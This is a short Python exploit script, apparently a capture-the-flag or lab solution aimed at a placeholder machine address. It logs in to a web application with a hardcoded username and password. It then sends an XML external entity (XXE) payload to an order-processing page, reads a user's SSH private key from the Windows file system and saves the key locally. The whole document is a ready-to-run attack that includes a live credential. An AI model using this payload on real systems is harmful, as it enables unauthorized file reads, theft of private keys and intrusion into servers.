#! /usr/bin/env python3
import requests

session = requests.Session()
host = 'http://<MACHINE_IP>'

username = 'Daniel'
password = '>SNDv*2wzLWf'
session.post(f'{host}/index.php', data={'username': username, 'password': password})

payload = """
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///C:/Users/daniel/.ssh/id_rsa'>]>
<order><quantity>123</quantity><item>&read;</item><address>123</address></order>
"""
response = session.post(f'{host}/process.php', data=payload)
private_key = response.text.replace('Your order for ', '').replace(' has been processed', '')

file = open('id_rsa', 'w')
file.write(private_key)
file.close()
